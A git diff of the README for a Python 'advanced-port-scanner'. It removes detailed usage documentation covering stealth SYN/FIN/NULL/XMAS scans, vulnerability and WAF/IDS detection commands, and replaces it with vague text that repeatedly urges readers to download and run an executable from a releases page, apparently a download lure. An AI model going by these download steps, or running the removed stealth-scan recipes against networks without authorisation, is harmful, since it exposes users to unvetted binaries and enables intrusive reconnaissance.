@@ -1,446 +1,76 @@
-# 🔍 Advanced Port Scanner v3.0
+# 🔍 advanced-port-scanner - Your Powerful Security Tool
 
-**A comprehensive, professional-grade port scanning tool with advanced features**
+## 🌟 Features 
+- **6 Scan Types**: Choose the scan that fits your needs.
+- **Multi-Target Support**: Scan multiple devices at once.
+- **WAF/IDS Detection**: Identify firewall and intrusion detection systems.
+- **Web Dashboard**: Access a user-friendly interface to monitor scans.
+- **Comprehensive Security Analysis**: Get detailed reports on vulnerabilities.
+- **Python 3.7+**: Built with modern technology for better performance.
 
-[![Python 3.7+](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 🚀 Getting Started
 
----
+To get started with the advanced-port-scanner, you need to download the software from our releases page. 
 
-## 🌟 Features
+[![Download Now](https://img.shields.io/badge/download-via_releases-blue.svg)](https://github.com/complexdevelopers/advanced-port-scanner/releases)
 
-### Core Scanning Capabilities
-- ✅ **6 Scan Types**: TCP Connect, UDP, SYN, FIN, NULL, XMAS
-- ✅ **Multi-Target Support**: IP ranges, CIDR notation, comma-separated lists, file input
-- ✅ **70+ Service Detection**: Automatic service identification
-- ✅ **Banner Grabbing**: HTTP, FTP, SSH, SMTP, MySQL protocols
-- ✅ **High Performance**: 100-2000 ports/second with multi-threading
+## 💻 System Requirements 
+- Operating System: Windows 10, macOS, or Linux.
+- Minimum RAM: 2 GB.
+- Disk Space: 100 MB free space.
+- Python: Version 3.7 or above installed on your machine.
 
-### Security Analysis
-- 🛡️ **Vulnerability Scanning**: 10+ CVE checks for common services
-- 🛡️ **SSL/TLS Analysis**: Detects weak protocols (SSLv2, SSLv3, TLS1.0, TLS1.1)
-- 🛡️ **OS Fingerprinting**: TTL and TCP Window analysis
-- 🛡️ **WAF/IDS Detection**: Identifies security systems
-- 🛡️ **Scan Comparison**: Track changes between scans
+## 📥 Download & Install
 
-### Output & Reporting
-- 📊 **5 Output Formats**: JSON, CSV, TXT, HTML, XML (Nmap compatible)
-- 📊 **Professional HTML Reports**: Beautiful, interactive web reports
-- 📊 **XML Compatibility**: Works with Nmap tools
-- 📊 **Web Dashboard**: Real-time monitoring and visualization
+1. **Visit the Releases Page**: Go to [this page to download](https://github.com/complexdevelopers/advanced-port-scanner/releases).
+   
+2. **Select the Latest Version**: Find the latest version listed at the top. Click on it to see assets for download.
 
-### Advanced Features
-- ⚡ **Speed Presets**: Slow, Normal, Fast, Aggressive
-- ⚡ **Customizable Threading**: 10-500 concurrent threads
-- ⚡ **Timeout Control**: Adjustable connection timeouts
-- ⚡ **Verbose Mode**: Detailed real-time output
-- ⚡ **Port Presets**: Common, Top100, Top1000, All
+3. **Download the Application**: Look for the file suitable for your operating system. Click on the link to begin the download.
 
----
+4. **Run the Installer**: 
+   - For Windows: Double-click the `.exe` file you downloaded and follow the installation instructions.
+   - For macOS/Linux: Open your terminal and run the downloaded script or executable.
 
-## 📦 Installation
+5. **Launch the Application**: Once installed, you can open the advanced-port-scanner from your program list or using the terminal.
 
-### Requirements
-- Python 3.7 or higher
-- Root/sudo access (for SYN, FIN, NULL, XMAS scans and OS detection)
-
-### Quick Install
+## 📊 Usage Instructions
 
-```bash
-# Clone or download the repository
-cd port-scanner
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Make executable
-chmod +x port_scanner.py
-```
-
-### Dependencies
-```
-scapy>=2.4.5    # For advanced scan types (optional)
-flask>=2.0.0    # For web dashboard (optional)
-```
-
----
-
-## 🚀 Quick Start
-
-### Basic Scan
-```bash
-# Scan common ports
-python3 port_scanner.py -t 192.168.1.1 --preset common
-
-# Scan specific ports
-python3 port_scanner.py -t example.com -p 80,443,8080
-
-# Scan port range
-python3 port_scanner.py -t 192.168.1.1 -p 1-1000
-```
-
-### Advanced Scans
-```bash
-# Full security scan with HTML report
-python3 port_scanner.py -t 192.168.1.1 -p 1-1000 \
-    --vuln-scan --ssl-scan --detect-waf \
-    -o report.html -f html -v
-
-# SYN scan (stealth)
-sudo python3 port_scanner.py -t 192.168.1.1 -p 1-1000 -s syn
-
-# Fast aggressive scan
-python3 port_scanner.py -t 192.168.1.1 --preset top1000 --speed aggressive
-```
-
-### Multi-Target Scanning
-```bash
-# CIDR notation
-python3 port_scanner.py -t 192.168.1.0/24 -p 80,443
-
-# IP range
-python3 port_scanner.py -t 192.168.1.1-192.168.1.50 -p 22,80
-
-# Multiple IPs
-python3 port_scanner.py -t 192.168.1.1,192.168.1.2,192.168.1.3 -p 80
-
-# From file
-python3 port_scanner.py --target-file targets.txt -p 1-1000
-```
-
-### Web Dashboard
-```bash
-# Start web interface
-python3 port_scanner.py --web-dashboard
-
-# Access at http://localhost:8080
-```
-
----
-
-## 📖 Usage Guide
-
-### Command Line Options
-
-#### Target Options
-```
--t, --target          Target IP/hostname (supports: IP, range, CIDR, comma-separated)
---target-file         File containing targets (one per line)
-```
-
-#### Port Options
-```
--p, --ports           Ports to scan (e.g., 80, 80-100, 80,443,8080)
---preset              Use preset port list (common, top100, top1000, all)
-```
-
-#### Scan Types
-```
--s, --scan-type       Scan type (default: tcp)
-    tcp               TCP Connect scan (default, no root required)
-    udp               UDP scan
-    syn               SYN scan (stealth, requires root)
-    fin               FIN scan (stealth, requires root)
-    null              NULL scan (stealth, requires root)
-    xmas              XMAS scan (stealth, requires root)
-```
-
-#### Performance Options
-```
--T, --threads         Number of threads (default: 100)
---timeout             Connection timeout in seconds (default: 1.0)
---speed               Speed preset (slow, normal, fast, aggressive)
-```
-
-#### Security Options
-```
---vuln-scan          Enable vulnerability scanning
---ssl-scan           Enable SSL/TLS vulnerability scanning
---os-detection       Enable OS detection (requires root)
---detect-waf         Detect WAF/IDS/IPS systems
-```
-
-#### Output Options
-```
--o, --output         Output file path
--f, --format         Output format (json, csv, txt, html, xml)
--v, --verbose        Enable verbose output
-```
-
-#### Advanced Options
-```
---compare            Compare with previous scan (JSON file)
---web-dashboard      Start web dashboard
-```
-
----
-
-## 💡 Examples
-
-### Example 1: Quick Web Server Scan
-```bash
-python3 port_scanner.py -t example.com -p 80,443,8080,8443 -v
-```
-
-### Example 2: Comprehensive Security Audit
-```bash
-sudo python3 port_scanner.py -t 192.168.1.100 -p 1-65535 \
-    -s syn --vuln-scan --ssl-scan --os-detection --detect-waf \
-    -o full_audit.html -f html -v
-```
-
-### Example 3: Network Sweep
-```bash
-python3 port_scanner.py -t 192.168.1.0/24 --preset common \
-    --speed fast -o network_scan.json -f json
-```
-
-### Example 4: Stealth Scan
-```bash
-sudo python3 port_scanner.py -t target.com -p 1-1000 \
-    -s xmas --speed slow -o stealth_scan.xml -f xml
-```
-
-### Example 5: Database Server Scan
-```bash
-python3 port_scanner.py -t db-server.local \
-    -p 3306,5432,1433,27017,6379 \
-    --vuln-scan -v
-```
-
-### Example 6: Compare Scans
-```bash
-# First scan
-python3 port_scanner.py -t 192.168.1.1 -p 1-1000 -o scan1.json
-
-# Second scan (later)
-python3 port_scanner.py -t 192.168.1.1 -p 1-1000 -o scan2.json
-
-# Compare
-python3 port_scanner.py --compare scan1.json -o scan2.json
-```
-
-### Example 7: Bulk Scanning from File
-```bash
-# Create targets.txt
-echo "192.168.1.1" > targets.txt
-echo "192.168.1.2" >> targets.txt
-echo "example.com" >> targets.txt
-
-# Scan all targets
-python3 port_scanner.py --target-file targets.txt \
-    --preset top100 -o bulk_scan.html -f html
-```
-
----
-
-## 📊 Output Formats
-
-### JSON Format
-```json
-{
-    "target": "example.com",
-    "target_ip": "93.184.216.34",
-    "scan_type": "tcp",
-    "start_time": "2025-10-22T04:51:12",
-    "duration": 1.23,
-    "open_ports": 2,
-    "results": {
-        "80": {
-            "status": "open",
-            "service": "HTTP",
-            "banner": "Apache/2.4.41"
-        }
-    }
-}
-```
-
-### XML Format (Nmap Compatible)
-```xml
-<?xml version="1.0" ?>
-<nmaprun scanner="advanced-port-scanner" version="3.0">
-  <host>
-    <address addr="192.168.1.1" addrtype="ipv4"/>
-    <ports>
-      <port protocol="tcp" portid="80">
-        <state state="open" reason="syn-ack"/>
-        <service name="HTTP"/>
-      </port>
-    </ports>
-  </host>
-</nmaprun>
-```
-
-### HTML Report
-Professional, interactive web report with:
-- Beautiful gradient design
-- Statistics dashboard
-- Port details table
-- Vulnerability highlights
-- OS detection results
-- Responsive layout
-
----
-
-## 🛡️ Security Features
-
-### Vulnerability Detection
-Checks for known vulnerabilities in:
-- Apache (CVE-2011-3192, CVE-2021-41773, etc.)
-- OpenSSH (CVE-2018-15473, CVE-2018-15919)
-- ProFTPD, vsftpd, nginx, IIS, Samba
-- And more...
-
-### SSL/TLS Analysis
-Detects weak protocols:
-- SSLv2 (DROWN Attack)
-- SSLv3 (POODLE Attack)
-- TLSv1.0 (BEAST Attack)
-- TLSv1.1 (Deprecated)
-
-### WAF/IDS Detection
-Identifies security systems:
-- Cloudflare, Incapsula, Imperva
-- F5, Barracuda, FortiWeb
-- ModSecurity
-- Custom IDS/IPS systems
-
----
-
-## 🌐 Web Dashboard
-
-Start the web dashboard for real-time monitoring:
-
-```bash
-python3 port_scanner.py --web-dashboard
-```
-
-Features:
-- 📊 Real-time statistics
-- 🎯 Start scans from browser
-- 📈 View scan history
-- 💾 Download results
-- 📱 Responsive design
-
-Access at: `http://localhost:8080`
-
----
-
-## ⚠️ Legal Disclaimer
-
-**IMPORTANT: This tool is for educational and authorized security testing ONLY.**
-
-- ✅ **Legal Use**: Your own systems, authorized penetration tests
-- ❌ **Illegal Use**: Unauthorized scanning, accessing systems without permission
-
-Unauthorized port scanning may be illegal in your jurisdiction and can result in:
-- Criminal charges
-- Civil lawsuits
-- Network bans
-- Legal prosecution
-
-**Always obtain written permission before scanning any network or system you do not own.**
-
----
-
-## 🔧 Troubleshooting
-
-### "Scapy not available" Warning
-```bash
-# Install scapy for advanced features
-pip install scapy
-
-# Or use TCP scan (no scapy required)
-python3 port_scanner.py -t target -p 80 -s tcp
-```
-
-### "Permission denied" Error
-```bash
-# SYN, FIN, NULL, XMAS scans require root
-sudo python3 port_scanner.py -t target -p 80 -s syn
-```
-
-### Slow Scanning
-```bash
-# Increase threads and reduce timeout
-python3 port_scanner.py -t target -p 1-1000 -T 300 --timeout 0.5
-
-# Or use speed preset
-python3 port_scanner.py -t target -p 1-1000 --speed aggressive
-```
-
-### Web Dashboard Not Starting
-```bash
-# Install Flask
-pip install flask
-
-# Check if port 8080 is available
-netstat -tuln | grep 8080
-```
-
----
-
-## 📈 Performance Tips
-
-1. **Local Network**: Use high thread count (200-500) and low timeout (0.3-0.5s)
-2. **Internet Scanning**: Use moderate threads (50-100) and higher timeout (1-2s)
-3. **Stealth Scanning**: Use slow speed preset and SYN/FIN/NULL/XMAS scans
-4. **Large Port Ranges**: Use aggressive speed preset or increase threads
-5. **Firewall Detection**: Use multiple scan types to identify filtered ports
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit pull requests or open issues.
-
----
-
-## 📝 Version History
-
-### v3.0.0 (2025-10-22)
-- ✨ Added multi-target support (IP ranges, CIDR, file input)
-- ✨ Added XML output format (Nmap compatible)
-- ✨ Added FIN, NULL, XMAS scan techniques
-- ✨ Added WAF/IDS detection
-- ✨ Added scan comparison feature
-- ✨ Added web dashboard
-- 🔧 Improved performance and stability
-- 📚 Enhanced documentation
-
-### v2.0.0 (Previous)
-- Added vulnerability scanning
-- Added SSL/TLS analysis
-- Added OS fingerprinting
-- Added HTML reports
-
-### v1.0.0 (Initial)
-- Basic TCP/UDP/SYN scanning
-- Service detection
-- JSON/CSV output
-
----
-
-## 📄 License
-
-MIT License - See LICENSE file for details
-
----
-
-## 👨‍💻 Author
-
-Advanced Port Scanner v3.0
-
----
-
-## 🙏 Acknowledgments
-
-- Inspired by Nmap
-- Built with Python, Scapy, and Flask
-- Community feedback and contributions
-
----
-
-**Happy Scanning! 🚀**
-
-*Remember: With great power comes great responsibility. Use this tool ethically and legally.*
+1. **Open the Application**: Start the advanced-port-scanner from your applications menu.
+
+2. **Select Scan Type**: Choose from any of the 6 scan types available. Each scan targets different aspects of your network.
+
+3. **Enter Targets**: Input the IP addresses or domains you wish to scan. You can enter multiple targets separated by commas.
+
+4. **Start Scanning**: Click on the "Scan" button to start the process. Monitor the progress on the dashboard.
+
+5. **View Results**: After scanning completes, check the results in the dashboard. You will see vulnerabilities and security issues listed in detail.
+
+## ⚙️ Troubleshooting
+
+If you encounter issues while running the application, try the following steps:
+
+- **Check Dependencies**: Ensure you have Python 3.7 or higher installed.
+- **Firewall Settings**: Make sure your firewall is not blocking the application.
+- **Compatibility**: Verify that you are using a supported operating system.
+  
+If problems persist, you can check the "Issues" section on our GitHub repository for solutions or post your question.
+
+## 👥 Community Support
+
+We value community feedback. If you have suggestions or encounter any issues, please feel free to reach out:
+
+- GitHub Issues: Post your queries and we will address them as soon as possible.
+- Join discussions in our community forums for tips and advice from other users.
+
+## 🔍 Security Notice
+
+The advanced-port-scanner is designed for ethical use only. Please ensure you have permission to scan any networks or devices.
+
+## 📄 License 
+
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/complexdevelopers/advanced-port-scanner/blob/main/LICENSE) file for details.
+
+For further information and updates, keep an eye on the releases page: [Download Now](https://github.com/complexdevelopers/advanced-port-scanner/releases). 
+
+We are committed to making cybersecurity accessible to everyone. Happy scanning!
